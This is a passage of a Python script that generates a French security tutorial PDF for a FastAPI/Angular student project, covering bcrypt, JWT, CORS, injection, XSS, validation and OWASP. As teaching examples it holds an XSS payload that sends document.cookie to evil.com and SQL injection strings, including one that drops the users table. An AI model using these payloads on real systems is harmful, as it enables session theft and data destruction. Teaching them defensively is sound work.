"""PDF 8 - Securite Complet"""
from pdf_utils import *
from reportlab.platypus import Spacer, PageBreak

story = []
cover_page(story, "PDF 08/10", "Securite Complete",
           "JWT + Bcrypt + CORS + OWASP + Validation",
           accent_color=HexColor('#EF4444'))

# TOC
story.append(Paragraph("Sommaire", ST_CHAPTER))
for label, page in [
    ("Chapitre 1 - Authentification vs Autorisation", "3"),
    ("Chapitre 2 - Mots de passe et bcrypt", "6"),
    ("Chapitre 3 - JWT en details", "10"),
    ("Chapitre 4 - CORS et meme origine", "15"),
    ("Chapitre 5 - SQL injection et son evitement", "18"),
    ("Chapitre 6 - XSS et son evitement", "22"),
    ("Chapitre 7 - Validation Pydantic", "26"),
    ("Chapitre 8 - Secrets et .env", "29"),
    ("Chapitre 9 - Rate limiting", "32"),
    ("Chapitre 10 - Roles et permissions", "35"),
    ("Chapitre 11 - OWASP Top 10", "38"),
    ("Chapitre 12 - HTTPS et TLS", "42"),
    ("Chapitre 13 - Conclusion", "45"),
]:
    story.append(toc_entry(label, page))
story.append(PageBreak())

# CH 1
story.append(Paragraph("Chapitre 1 - Authentification vs Autorisation", ST_CHAPTER))

story.append(Paragraph("1.1 Definitions", ST_H1))
story.append(std_table([
    ['Concept', 'Question repondue', 'Exemple'],
    ['Authentification', 'Qui es-tu ?', 'Email + password'],
    ['Autorisation', 'As-tu le droit ?', 'Role STUDENT vs ADMIN'],
    ['Audit', 'Qu\'as-tu fait ?', 'Log des actions'],
], col_widths=[3.5*cm, 5*cm, 7.5*cm]))

story.append(analogy(
    "Imagine un <b>aeroport</b>. L'<b>authentification</b> = on verifie ton passeport (qui es-tu). "
    "L'<b>autorisation</b> = on verifie ton billet (as-tu le droit d'entrer dans le salon VIP). "
    "L'<b>audit</b> = les cameras enregistrent ton parcours."))

story.append(Paragraph("1.2 Authentification : methodes courantes", ST_H1))
story.append(std_table([
    ['Methode', 'Force', 'Inconvenient'],
    ['Login/password simple', 'Universel', 'Mots de passe faibles'],
    ['Email magic link', 'Pas de password', 'Email peut etre compromis'],
    ['SSO (Google, Microsoft)', 'Tres pratique', 'Depend du fournisseur'],
    ['MFA (2FA)', 'Tres securise', 'Plus complexe'],
    ['Biometrique', 'Difficile a copier', 'Materiel necessaire'],
    ['OAuth 2.0', 'Standard', 'Complexe a implementer'],
], col_widths=[3.5*cm, 5*cm, 7.5*cm]))

story.append(Paragraph("1.3 Notre choix (Phase 2)", ST_H1))
story.append(Paragraph(
    "Pour le PFE en Phase 2, on utilisera :",
    ST_BODY))
for x in [
    "<b>Email + password</b> classique pour la simplicite",
    "<b>Bcrypt</b> pour hasher les mots de passe",
    "<b>JWT</b> pour les sessions stateless",
    "<b>4 roles</b> : STUDENT, PROFESSOR, SCOLARITE, ADMIN",
]:
    story.append(Paragraph(f"+ {x}", ST_LIST))
story.append(PageBreak())

# CH 2 - Bcrypt
story.append(Paragraph("Chapitre 2 - Mots de passe et bcrypt", ST_CHAPTER))

story.append(Paragraph("2.1 Ne JAMAIS stocker en clair", ST_H1))
story.append(alert_box(
    "<b>REGLE D'OR :</b> ne jamais stocker les mots de passe en clair dans la BDD. Si elle "
    "est piratee, tous les comptes sont compromis. Et puisque beaucoup d'utilisateurs "
    "reutilisent leurs mots de passe sur d'autres sites, c'est catastrophique.",
    kind="danger"))

story.append(Paragraph("2.2 Hashage cryptographique", ST_H1))
story.append(Paragraph(
    "Un <b>hash</b> est une fonction qui transforme un mot de passe en chaine fixe, de "
    "maniere <b>IRREVERSIBLE</b>. Tu peux verifier qu'un mot de passe correspond, mais tu "
    "ne peux pas retrouver le mot de passe a partir du hash.",
    ST_BODY))

story.append(code(
    "Mot de passe : \"monMotDePasse123\"\n"
    "                    |\n"
    "                    v Hash (bcrypt)\n"
    "                    |\n"
    "Hash : \"$2b$12$xK9YdLkMnQ8XRtTjVz...\"\n"
    "        (60 caracteres)\n"
    "\n"
    "Pour verifier au login :\n"
    "  hash(input_password) == stored_hash ?"
))

story.append(Paragraph("2.3 Pourquoi bcrypt et pas MD5/SHA ?", ST_H1))
for x in [
    "MD5 et SHA sont TRES rapides -> bruteforce facile",
    "Bcrypt est <b>lent volontairement</b> -> bruteforce dur",
    "Bcrypt utilise un <b>salt</b> aleatoire -> protege contre rainbow tables",
    "Bcrypt a un <b>cost factor</b> ajustable (qu'on augmente avec le temps)",
]:
    story.append(Paragraph(f"+ {x}", ST_LIST))

story.append(Paragraph("2.4 Implementation Python", ST_H1))
story.append(code(
    "pip install passlib[bcrypt]\n"
    "\n"
    "from passlib.context import CryptContext\n"
    "\n"
    "pwd_context = CryptContext(schemes=['bcrypt'], deprecated='auto')\n"
    "\n"
    "# Au registration\n"
    "def hash_password(password: str) -> str:\n"
    "    return pwd_context.hash(password)\n"
    "\n"
    "# Au login\n"
    "def verify_password(plain: str, hashed: str) -> bool:\n"
    "    return pwd_context.verify(plain, hashed)\n"
    "\n"
    "# Exemple\n"
    "hash = hash_password('monMotDePasse123')\n"
    "print(hash)\n"
    "# '$2b$12$xK9YdLkMnQ8XRtTjVz...'\n"
    "\n"
    "verify_password('monMotDePasse123', hash)  # True\n"
    "verify_password('mauvaisMdp', hash)         # False"
))

story.append(Paragraph("2.5 Cost factor de bcrypt", ST_H1))
story.append(Paragraph(
    "Le cost factor (par defaut 12) determine la lenteur volontaire. Plus c'est haut, plus "
    "c'est lent (mais plus securise).",
    ST_BODY))
story.append(std_table([
    ['Cost', 'Temps par hash', 'Securite'],
    ['10', '~80 ms', 'Bon'],
    ['12 (defaut)', '~250 ms', 'Tres bon'],
    ['14', '~1 sec', 'Excellent'],
    ['16', '~4 sec', 'Trop lent'],
], col_widths=[2*cm, 5*cm, 5*cm]))

story.append(alert_box(
    "<b>250ms par hash semble lent</b>. C'est intentionnel ! Un attaquant qui aurait recupere "
    "tous les hashes met 1000x plus de temps a bruteforce. Pour un user legit, 250ms = "
    "imperceptible.",
    kind="info"))
story.append(PageBreak())

# CH 3 - JWT
story.append(Paragraph("Chapitre 3 - JWT en details", ST_CHAPTER))

story.append(Paragraph("3.1 C'est quoi JWT ?", ST_H1))
story.append(Paragraph(
    "<b>JWT = JSON Web Token</b>. Standard pour transmettre des informations entre 2 parties "
    "de maniere securisee. Largement utilise pour l'authentification stateless.",
    ST_BODY))

story.append(analogy(
    "JWT est comme un <b>bracelet de festival</b>. A l'entree, on verifie ton ticket (mot de "
    "passe). On te met un bracelet (JWT) avec ton nom, age, type de billet. Ensuite, tu "
    "rentres dans n'importe quel concert juste avec le bracelet. Le bracelet est valide "
    "jusqu'a une certaine heure et son authenticite est verifiable au regard."))

story.append(Paragraph("3.2 Structure d'un JWT", ST_H1))
story.append(Paragraph(
    "Un JWT a 3 parties separees par des points :",
    ST_BODY))
story.append(code(
    "HEADER.PAYLOAD.SIGNATURE\n"
    "\n"
    "Exemple :\n"
    "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9\n"
    ".eyJ1c2VyX2lkIjoxLCJyb2xlIjoic3R1ZGVudCIsImV4cCI6MTczNTY3MjAwMH0\n"
    ".AbCd1234..."
))

story.append(Paragraph("3.3 Decoder un JWT", ST_H1))
story.append(code(
    "// HEADER (base64-decode)\n"
    "{\n"
    "  \"typ\": \"JWT\",\n"
    "  \"alg\": \"HS256\"\n"
    "}\n"
    "\n"
    "// PAYLOAD (base64-decode)\n"
    "{\n"
    "  \"user_id\": 1,\n"
    "  \"role\": \"student\",\n"
    "  \"exp\": 1735672000   // timestamp d'expiration\n"
    "}\n"
    "\n"
    "// SIGNATURE\n"
    "HMAC-SHA256(\n"
    "  base64UrlEncode(header) + '.' + base64UrlEncode(payload),\n"
    "  SECRET_KEY\n"
    ")"
))

story.append(alert_box(
    "Le payload est juste <b>encode base64</b>, pas chiffre. N'importe qui peut lire ce qu'il "
    "contient (va sur jwt.io et colle un token). NE JAMAIS mettre de donnees sensibles "
    "(password, CIN, etc.) dans le payload.",
    kind="warning"))

story.append(Paragraph("3.4 Generation d'un JWT", ST_H1))
story.append(code(
    "pip install python-jose[cryptography]\n"
    "\n"
    "from jose import jwt\n"
    "from datetime import datetime, timedelta\n"
    "\n"
    "SECRET_KEY = \"votre_secret_tres_long_et_aleatoire\"\n"
    "ALGORITHM = \"HS256\"\n"
    "\n"
    "def create_access_token(user_id: int, role: str) -> str:\n"
    "    payload = {\n"
    "        \"user_id\": user_id,\n"
    "        \"role\": role,\n"
    "        \"exp\": datetime.utcnow() + timedelta(hours=24)\n"
    "    }\n"
    "    return jwt.encode(payload, SECRET_KEY, algorithm=ALGORITHM)"
))

story.append(Paragraph("3.5 Verification d'un JWT", ST_H1))
story.append(code(
    "from jose import jwt, JWTError\n"
    "\n"
    "def decode_token(token: str) -> dict:\n"
    "    try:\n"
    "        payload = jwt.decode(\n"
    "            token,\n"
    "            SECRET_KEY,\n"
    "            algorithms=[ALGORITHM]\n"
    "        )\n"
    "        return payload  # {user_id, role, exp}\n"
    "    except JWTError as e:\n"
    "        # Signature invalide ou expire\n"
    "        raise HTTPException(401, f'Token invalide : {e}')"
))

story.append(Paragraph("3.6 Flow complet d'auth", ST_H1))
story.append(diagram(
    "  [User] POST /api/auth/login { email, password }\n"
    "         |\n"
    "         v\n"
    "  [Backend]\n"
    "    1. Cherche user par email en BDD\n"
    "    2. verify_password(password, user.hashed_password)\n"
    "    3. Si OK : create_access_token(user.id, user.role)\n"
    "         |\n"
    "         v\n"
    "  [Response] { access_token: \"eyJ...\", token_type: \"Bearer\" }\n"
    "         |\n"
    "         v\n"
    "  [User stocke le token dans localStorage]\n"
    "         |\n"
    "         v\n"
    "  [User envoie a chaque requete]\n"
    "    GET /api/me\n"
    "    Authorization: Bearer eyJ...\n"
    "         |\n"
    "         v\n"
    "  [Backend]\n"
    "    1. Extrait le token de Authorization\n"
    "    2. decode_token(token)\n"
    "    3. Si OK : user_id et role recuperes\n"
    "    4. Renvoie les donnees user"
))

story.append(Paragraph("3.7 Refresh tokens", ST_H1))
story.append(Paragraph(
    "Pour eviter de demander le mot de passe toutes les 24h :",
    ST_BODY))
for x in [
    "<b>Access token</b> court (15 min) : utilise pour les requetes API",
    "<b>Refresh token</b> long (7-30 jours) : pour regenerer un access token",
    "Quand l'access expire, on POST /api/auth/refresh avec le refresh token",
    "Pour deconnecter : invalider le refresh token cote serveur",
]:
    story.append(Paragraph(f"• {x}", ST_LIST))
story.append(PageBreak())

# CH 4 - CORS
story.append(Paragraph("Chapitre 4 - CORS et meme origine", ST_CHAPTER))

story.append(Paragraph("4.1 Same-Origin Policy", ST_H1))
story.append(Paragraph(
    "Par defaut, le navigateur applique la <b>Same-Origin Policy</b> : un site (origine A) "
    "ne peut pas faire de requetes vers un autre site (origine B). C'est une protection.",
    ST_BODY))

story.append(Paragraph("4.2 Une 'origine'", ST_H1))
story.append(Paragraph(
    "Une origine = scheme + host + port. Exemples :",
    ST_BODY))
story.append(code(
    "https://fsbm.ma:443    -> origine 1\n"
    "http://fsbm.ma:80      -> origine 2 (different scheme)\n"
    "https://www.fsbm.ma    -> origine 3 (different host)\n"
    "https://fsbm.ma:8443   -> origine 4 (different port)\n"
    "\n"
    "Tous DIFFERENTS"
))

story.append(Paragraph("4.3 CORS = exception", ST_H1))
story.append(Paragraph(
    "<b>CORS = Cross-Origin Resource Sharing</b>. Mecanisme par lequel un serveur autorise "
    "explicitement certaines origines a faire des requetes cross-origin.",
    ST_BODY))

story.append(Paragraph("4.4 Implementation FastAPI", ST_H1))
story.append(code(
    "from fastapi.middleware.cors import CORSMiddleware\n"
    "\n"
    "app.add_middleware(\n"
    "    CORSMiddleware,\n"
    "    allow_origins=[\n"
    "        'http://localhost:4200',\n"
    "        'https://fsbm-platform.com',  # prod\n"
    "    ],\n"
    "    allow_credentials=True,           # cookies/auth headers\n"
    "    allow_methods=['*'],              # GET, POST, PUT, DELETE...\n"
    "    allow_headers=['*'],              # tous les headers\n"
    ")"
))

story.append(alert_box(
    "NE JAMAIS mettre <code>allow_origins=['*']</code> en production. C'est l'equivalent de "
    "'tout le monde peut acceder'. Toujours lister explicitement les origines autorisees.",
    kind="warning"))

story.append(Paragraph("4.5 Preflight OPTIONS", ST_H1))
story.append(Paragraph(
    "Pour les requetes 'complexes' (POST avec JSON, headers custom), le navigateur fait "
    "d'abord une requete <b>OPTIONS</b> pour demander la permission. Le serveur repond avec "
    "les headers CORS appropries.",
    ST_BODY))
story.append(code(
    "Browser -> Server : OPTIONS /api/chat\n"
    "                    Origin: http://localhost:4200\n"
    "                    Access-Control-Request-Method: POST\n"
    "\n"
    "Server -> Browser : 200 OK\n"
    "                    Access-Control-Allow-Origin: http://localhost:4200\n"
    "                    Access-Control-Allow-Methods: GET, POST\n"
    "                    Access-Control-Allow-Headers: Content-Type, Authorization\n"
    "\n"
    "Browser -> Server : POST /api/chat (la vraie requete)"
))
story.append(PageBreak())

# CH 5 - SQL injection
story.append(Paragraph("Chapitre 5 - SQL injection et son evitement", ST_CHAPTER))

story.append(Paragraph("5.1 La vulnerabilite", ST_H1))
story.append(Paragraph(
    "<b>SQL injection</b> = quand l'utilisateur insere du code SQL malveillant dans un input, "
    "qui est ensuite execute par la BDD.",
    ST_BODY))

story.append(Paragraph("5.2 Exemple classique", ST_H1))
story.append(code(
    "# DANGEREUX (ne JAMAIS faire)\n"
    "@router.get('/api/users/{username}')\n"
    "async def find_user(username: str, db = Depends(get_db)):\n"
    "    sql = f\"SELECT * FROM users WHERE username = '{username}'\"\n"
    "    result = await db.execute(sql)\n"
    "    return result.fetchall()\n"
    "\n"
    "# L'attaquant fait :\n"
    "# GET /api/users/admin' OR '1'='1\n"
    "\n"
    "# Le SQL devient :\n"
    "# SELECT * FROM users WHERE username = 'admin' OR '1'='1'\n"
    "# -> retourne TOUS les utilisateurs (l'admin compris)\n"
    "\n"
    "# Pire :\n"
    "# GET /api/users/x'; DROP TABLE users; --\n"
    "# -> Detruit la table users !"
))

story.append(Paragraph("5.3 La solution : requetes parametriees", ST_H1))
story.append(code(
    "# SECURISE (toujours faire ca)\n"
    "@router.get('/api/users/{username}')\n"
    "async def find_user(username: str, db: AsyncSession = Depends(get_db)):\n"
    "    stmt = select(User).where(User.username == username)\n"
    "    result = await db.execute(stmt)\n"
    "    return result.scalars().first()\n"
    "\n"
    "# SQLAlchemy genere automatiquement :\n"
    "# SELECT * FROM users WHERE username = ?  (avec ? lie a username)\n"
    "# La BDD echappe TOUTES les apostrophes/special chars\n"
    "# L'attaque ne fonctionne plus"
))

story.append(alert_box(
    "<b>Notre projet utilise EXCLUSIVEMENT SQLAlchemy avec des requetes parametriees</b>. "
    "Il n'y a aucune concatenation manuelle de SQL dans le code. Donc immunise contre les "
    "injections SQL.",
    kind="success"))

story.append(Paragraph("5.4 Que faire si on doit ABSOLUMENT du SQL brut ?", ST_H1))
story.append(code(
    "from sqlalchemy import text\n"
    "\n"
    "# Mauvais (vulnerable)\n"
    "await db.execute(text(f\"DELETE FROM users WHERE id = {user_id}\"))\n"
    "\n"
    "# Bon (parametrise)\n"
    "await db.execute(\n"
    "    text(\"DELETE FROM users WHERE id = :uid\"),\n"
    "    {\"uid\": user_id}\n"
    ")"
))
story.append(PageBreak())

# CH 6 - XSS
story.append(Paragraph("Chapitre 6 - XSS et son evitement", ST_CHAPTER))

story.append(Paragraph("6.1 C'est quoi XSS ?", ST_H1))
story.append(Paragraph(
    "<b>XSS = Cross-Site Scripting</b>. Vulnerabilite ou un attaquant injecte du JavaScript "
    "malveillant dans un site, execute par les autres utilisateurs.",
    ST_BODY))

story.append(Paragraph("6.2 Exemple", ST_H1))
story.append(code(
    "// Site qui affiche des commentaires sans nettoyage\n"
    "function showComment(comment) {\n"
    "  document.getElementById('comments').innerHTML += comment;\n"
    "}\n"
    "\n"
    "// L'attaquant poste un commentaire :\n"
    "// <script>fetch('http://evil.com?cookies=' + document.cookie)</script>\n"
    "\n"
    "// Chaque utilisateur qui voit ce commentaire :\n"
    "// Le JS s'execute dans son navigateur\n"
    "// Envoie ses cookies (session) a evil.com\n"
    "// L'attaquant peut maintenant se faire passer pour lui"
))

story.append(Paragraph("6.3 Comment Angular protege contre XSS", ST_H1))
story.append(Paragraph(
    "Angular <b>echape automatiquement</b> le contenu utilisateur. Les balises HTML/JS sont "
    "converties en texte affiche.",
    ST_BODY))
story.append(code(
    "// Angular template\n"
    "<p>{{ userInput }}</p>\n"
    "\n"
    "// Si userInput = \"<script>alert('XSS')</script>\"\n"
    "// Angular affiche LITTERALEMENT :\n"
    "// <p>&lt;script&gt;alert('XSS')&lt;/script&gt;</p>\n"
    "// Le script ne s'execute PAS"
))

story.append(Paragraph("6.4 Cas dangereux : innerHTML", ST_H1))
story.append(code(
    "// DANGEREUX\n"
    "<div [innerHTML]=\"userInput\"></div>\n"
    "// innerHTML execute le HTML/JS\n"
    "\n"
    "// SECURISE : utiliser interpolation\n"
    "<div>{{ userInput }}</div>\n"
    "// Texte echape"
))

story.append(Paragraph("6.5 Content Security Policy (CSP)", ST_H1))
story.append(Paragraph(
    "Header HTTP qui dit au navigateur quelles sources de scripts/styles/etc. sont autorisees.",
    ST_BODY))
story.append(code(
    "Content-Security-Policy: \n"
    "  default-src 'self';                    # tout depuis notre domaine seulement\n"
    "  script-src 'self' 'unsafe-inline';     # scripts inline OK (Angular en a besoin)\n"
    "  img-src 'self' https://*.fsbm.ma;      # images de notre domaine + fsbm.ma\n"
    "  connect-src 'self' http://localhost:8001 http://localhost:8002;"
))
story.append(PageBreak())

# CH 7 - Pydantic
story.append(Paragraph("Chapitre 7 - Validation Pydantic", ST_CHAPTER))

story.append(Paragraph("7.1 Pydantic = filet de securite", ST_H1))
story.append(Paragraph(
    "Pydantic valide automatiquement tous les inputs API. C'est une ligne de defense "
    "<b>critique</b> contre les attaques.",
    ST_BODY))

story.append(Paragraph("7.2 Exemple : validation forte", ST_H1))
story.append(code(
    "from pydantic import BaseModel, Field, EmailStr, field_validator\n"
    "\n"
    "class UserRegister(BaseModel):\n"
    "    email: EmailStr                              # validation email\n"
    "    password: str = Field(..., min_length=8)     # min 8 chars\n"
    "    name: str = Field(..., min_length=2, max_length=80)\n"
    "    age: int = Field(..., ge=17, le=80)          # 17 a 80\n"
    "    cne: str = Field(..., pattern=r'^[0-9]{10}$') # 10 chiffres\n"
    "    \n"
    "    @field_validator('password')\n"
    "    @classmethod\n"
    "    def password_strength(cls, v: str) -> str:\n"
    "        if not any(c.isupper() for c in v):\n"
    "            raise ValueError('Au moins 1 majuscule')\n"
    "        if not any(c.isdigit() for c in v):\n"
    "            raise ValueError('Au moins 1 chiffre')\n"
    "        return v"
))

story.append(Paragraph("7.3 Validations qu'on devrait faire", ST_H1))
for x in [
    "<b>Length max</b> sur tous les champs string -> evite payloads geants",
    "<b>Types</b> stricts -> evite passage de string au lieu d'int",
    "<b>Patterns regex</b> sur les formats (CNE, email, telephone)",
    "<b>Enum</b> pour les valeurs limitees (role, status, type)",
    "<b>Range</b> sur les nombres (age, note, page_size)",
    "<b>Validateurs custom</b> pour les regles metier",
]:
    story.append(Paragraph(f"+ {x}", ST_LIST))
story.append(PageBreak())

# CH 8 - Secrets
story.append(Paragraph("Chapitre 8 - Secrets et .env", ST_CHAPTER))

story.append(Paragraph("8.1 Le danger des hardcoded secrets", ST_H1))
story.append(code(
    "# JAMAIS FAIRE\n"
    "DB_PASSWORD = 'monPasswordSuper123'\n"
    "GROQ_API_KEY = 'gsk_xxx'\n"
    "JWT_SECRET = 'monSecret'\n"
    "\n"
    "# Probleme : si on commit ce code sur GitHub, le monde entier voit les secrets !"
))

story.append(Paragraph("8.2 La solution : .env", ST_H1))
story.append(code(
    "# .env (jamais commit, dans .gitignore)\n"
    "DB_PASSWORD=monPasswordSuper123\n"
    "GROQ_API_KEY=gsk_xxx\n"
    "JWT_SECRET=monSecretLongEtAleatoire\n"
    "\n"
    "# config.py\n"
    "from pydantic_settings import BaseSettings\n"
    "\n"
    "class Settings(BaseSettings):\n"
    "    db_password: str = ''\n"
    "    groq_api_key: str = ''\n"
    "    jwt_secret: str = ''\n"
    "    \n"
    "    model_config = SettingsConfigDict(env_file='.env')\n"
    "\n"
    "settings = Settings()  # charge depuis .env"
))

story.append(Paragraph("8.3 .gitignore obligatoire", ST_H1))
story.append(code(
    "# .gitignore\n"
    ".env\n"
    "*.env\n"
    ".env.local\n"
    ".env.production"
))

story.append(Paragraph("8.4 Bonne pratique : .env.example", ST_H1))
story.append(code(
    "# .env.example (commit OK, sans vraies valeurs)\n"
    "DB_PASSWORD=changeme\n"
    "GROQ_API_KEY=gsk_xxx_replace_me\n"
    "JWT_SECRET=generate_long_random_string\n"
    "\n"
    "# Le nouveau developpeur :\n"
    "# cp .env.example .env\n"
    "# nano .env  # remplir les vrais valeurs"
))

story.append(Paragraph("8.5 En production : secret managers", ST_H1))
for x in [
    "<b>AWS Secrets Manager</b>",
    "<b>HashiCorp Vault</b>",
    "<b>Azure Key Vault</b>",
    "<b>Google Cloud Secret Manager</b>",
]:
    story.append(Paragraph(f"• {x}", ST_LIST))
story.append(PageBreak())

# CH 9 - Rate limiting
story.append(Paragraph("Chapitre 9 - Rate limiting", ST_CHAPTER))

story.append(Paragraph("9.1 Pourquoi limiter ?", ST_H1))
for x in [
    "Empecher le bruteforce de mots de passe (10 tentatives/min)",
    "Limiter l'usage abusif des APIs payantes (cout)",
    "Proteger contre les DoS (denial of service)",
    "Equite entre utilisateurs (un ne monopolise pas)",
]:
    story.append(Paragraph(f"• {x}", ST_LIST))

story.append(Paragraph("9.2 SlowAPI pour FastAPI", ST_H1))
story.append(code(
    "pip install slowapi\n"
    "\n"
    "from slowapi import Limiter\n"
    "from slowapi.util import get_remote_address\n"
    "\n"
    "limiter = Limiter(key_func=get_remote_address)\n"
    "app.state.limiter = limiter\n"
    "\n"
    "@router.post('/api/auth/login')\n"
    "@limiter.limit('5/minute')          # 5 tentatives par minute par IP\n"
    "async def login(request: Request, ...):\n"
    "    ...\n"
    "\n"
    "@router.post('/api/chat')\n"
    "@limiter.limit('60/minute')         # 60 messages par minute par IP\n"
    "async def chat(request: Request, ...):\n"
    "    ..."
))

story.append(Paragraph("9.3 Reponse en cas de depassement", ST_H1))
story.append(code(
    "HTTP/1.1 429 Too Many Requests\n"
    "Content-Type: application/json\n"
    "X-RateLimit-Limit: 5\n"
    "X-RateLimit-Remaining: 0\n"
    "X-RateLimit-Reset: 1735672000\n"
    "Retry-After: 30\n"
    "\n"
    "{\n"
    "  \"detail\": \"Rate limit exceeded: 5 per 1 minute\"\n"
    "}"
))
story.append(PageBreak())

# CH 10 - Roles
story.append(Paragraph("Chapitre 10 - Roles et permissions", ST_CHAPTER))

story.append(Paragraph("10.1 RBAC : Role-Based Access Control", ST_H1))
story.append(Paragraph(
    "Chaque utilisateur a un <b>role</b> qui determine ses permissions.",
    ST_BODY))

story.append(Paragraph("10.2 Les 4 roles prevus (Phase 2)", ST_H1))
story.append(std_table([
    ['Role', 'Permissions'],
    ['STUDENT', 'Lecture, chatbot, ses propres reviews et feedbacks'],
    ['PROFESSOR', 'Lecture, ajouter notes a ses modules, modifier FAQ'],
    ['SCOLARITE', 'Modifier donnees etudiants, creer annonces'],
    ['ADMIN', 'Tout + gestion comptes + statistiques globales'],
], col_widths=[3*cm, 13*cm]))

story.append(Paragraph("10.3 Implementation FastAPI", ST_H1))
story.append(code(
    "from enum import Enum\n"
    "from fastapi import Depends, HTTPException\n"
    "\n"
    "class Role(str, Enum):\n"
    "    STUDENT = 'STUDENT'\n"
    "    PROFESSOR = 'PROFESSOR'\n"
    "    SCOLARITE = 'SCOLARITE'\n"
    "    ADMIN = 'ADMIN'\n"
    "\n"
    "async def require_role(required: Role):\n"
    "    async def checker(user: User = Depends(get_current_user)):\n"
    "        if user.role != required and user.role != Role.ADMIN:\n"
    "            raise HTTPException(403, f'Role {required} requis')\n"
    "        return user\n"
    "    return checker\n"
    "\n"
    "@router.delete('/api/users/{id}')\n"
    "async def delete_user(\n"
    "    id: int,\n"
    "    admin: User = Depends(require_role(Role.ADMIN))\n"
    "):\n"
    "    # Seul un admin peut supprimer des users\n"
    "    ..."
))
story.append(PageBreak())

# CH 11 - OWASP
story.append(Paragraph("Chapitre 11 - OWASP Top 10", ST_CHAPTER))

story.append(Paragraph(
    "L'<b>OWASP</b> (Open Web Application Security Project) publie tous les ans la liste des "
    "10 vulnerabilites web les plus critiques. Reference incontournable.",
    ST_BODY))

story.append(Paragraph("OWASP Top 10 (2021)", ST_H1))
owasp = [
    ("A01 - Broken Access Control",
     "Mauvaise verification des permissions. Ex: utiliser /api/users/42 pour acceder a un user dont on n'est pas. "
     "<b>Solution :</b> verifier que user.id == requested_id ou role admin."),
    ("A02 - Cryptographic Failures",
     "Donnees sensibles non chiffrees. <b>Solution :</b> HTTPS obligatoire, bcrypt pour passwords."),
    ("A03 - Injection (SQL, OS, etc.)",
     "Vu au chapitre 5. <b>Solution :</b> requetes parametriees (SQLAlchemy)."),
    ("A04 - Insecure Design",
     "Architecture defectueuse (ex: pas de rate limit, secrets en clair). <b>Solution :</b> security by design."),
    ("A05 - Security Misconfiguration",
     "Config par defaut, port debug ouvert, secrets exposes. <b>Solution :</b> harden la config."),
    ("A06 - Vulnerable Components",
     "Dependances pas a jour avec CVE. <b>Solution :</b> pip-audit, Snyk, Dependabot."),
    ("A07 - Auth Failures",
     "Mauvaise gestion sessions, JWT mal valides. <b>Solution :</b> python-jose + verif exp."),
    ("A08 - Data Integrity Failures",
     "Deserialisation insecure, dependances non verifiees. <b>Solution :</b> Pydantic + hashes."),
    ("A09 - Logging & Monitoring Failures",
     "Pas de logs, pas d'alertes. <b>Solution :</b> logger toutes les actions sensibles."),
    ("A10 - Server-Side Request Forgery (SSRF)",
     "Le serveur fait une requete vers une URL controlee par l'attaquant. <b>Solution :</b> whitelist."),
]
for n, d in owasp:
    story.append(Paragraph(f"<b>{n}.</b> {d}", ST_LIST))
story.append(PageBreak())

# CH 12 - HTTPS
story.append(Paragraph("Chapitre 12 - HTTPS et TLS", ST_CHAPTER))

story.append(Paragraph("12.1 HTTP vs HTTPS", ST_H1))
story.append(Paragraph(
    "<b>HTTP</b> = communication en clair. N'importe qui sur le reseau (WiFi public, ISP) "
    "peut lire ce qui transite.<br/><b>HTTPS</b> = HTTP + TLS. Communication chiffree, "
    "personne ne peut lire (sauf le client et le serveur).",
    ST_BODY))

story.append(Paragraph("12.2 TLS en bref", ST_H1))
story.append(Paragraph(
    "<b>TLS = Transport Layer Security</b>. Successeur de SSL. Voici ce qui se passe a "
    "l'etablissement de connexion :",
    ST_BODY))
for n, d in [
    ("1. Client Hello",
     "Le navigateur envoie sa liste de chiffrements supportes."),
    ("2. Server Hello + Certificate",
     "Le serveur choisit un chiffrement et envoie son certificat (signe par autorite de certification)."),
    ("3. Verification du cert",
     "Le navigateur verifie que le certificat est valide (signe par CA connue, pas expire, bon domaine)."),
    ("4. Key Exchange",
     "Echange de cles cryptographiques (Diffie-Hellman) pour creer une cle de session symetrique."),
    ("5. Communication chiffree",
     "Toutes les donnees suivantes sont chiffrees avec la cle de session."),
]:
    story.append(Paragraph(f"<b>{n}.</b> {d}", ST_LIST))

story.append(Paragraph("12.3 Obtenir un certificat", ST_H1))
for x in [
    "<b>Let's Encrypt</b> (GRATUIT, automatique avec certbot)",
    "<b>Cloudflare</b> (GRATUIT avec leur CDN)",
    "<b>DigiCert, Sectigo</b> (commerciaux, pour entreprises)",
]:
    story.append(Paragraph(f"• {x}", ST_LIST))

story.append(Paragraph("12.4 En dev vs en prod", ST_H1))
story.append(std_table([
    ['Environnement', 'URL', 'Note'],
    ['Dev local', 'http://localhost:4200', 'HTTP OK car local'],
    ['Staging', 'https://staging.fsbm.ma', 'HTTPS obligatoire'],
    ['Production', 'https://fsbm.ma', 'HTTPS obligatoire + HSTS'],
], col_widths=[3.5*cm, 6.5*cm, 6*cm]))

story.append(alert_box(
    "<b>HSTS = HTTP Strict Transport Security</b>. Header qui dit au navigateur 'TOUJOURS "
    "utiliser HTTPS pour ce site, meme si l'user tape http://'. Critique en production.",
    kind="tip"))
story.append(PageBreak())

# CH 13 - Conclusion
story.append(Paragraph("Chapitre 13 - Conclusion", ST_CHAPTER))

story.append(Paragraph("13.1 Recap des mesures", ST_H1))
for x in [
    "Authentification = qui es-tu (email/password + bcrypt)",
    "Autorisation = as-tu le droit (roles + permissions)",
    "JWT pour sessions stateless (24h + refresh)",
    "Bcrypt cost 12 pour les passwords (irreversible)",
    "CORS avec whitelist d'origines (pas '*')",
    "SQLAlchemy = immunise contre SQL injection",
    "Angular = echape auto contre XSS",
    "Pydantic = validation forte de tous les inputs",
    "Secrets dans .env (jamais commit)",
    "Rate limiting (SlowAPI) sur endpoints sensibles",
    "HTTPS obligatoire en production",
    "OWASP Top 10 comme checklist",
]:
    story.append(Paragraph(f"+ {x}", ST_LIST))

story.append(Paragraph("13.2 Etat actuel du projet (Phase 1)", ST_H1))
for x in [
    "[OK] Validation Pydantic stricte sur tous les inputs",
    "[OK] SQLAlchemy parametrise (anti SQL injection)",
    "[OK] CORS configure (localhost:4200 only)",
    "[OK] Secrets dans .env",
    "[OK] Angular echappe XSS automatiquement",
    "[OK] HTTPException avec codes appropries",
    "[Phase 2] JWT authentification",
    "[Phase 2] Bcrypt password hashing",
    "[Phase 2] RBAC avec 4 roles",
    "[Phase 2] Rate limiting",
    "[Phase 3] HTTPS en production",
]:
    story.append(Paragraph(f"• {x}", ST_LIST))

story.append(Paragraph("13.3 Pour aller plus loin", ST_H1))
for x in [
    "PDF 03 - implementation FastAPI",
    "PDF 07 - APIs et communication",
    "OWASP Cheat Sheet Series (online)",
    "FastAPI Security documentation",
]:
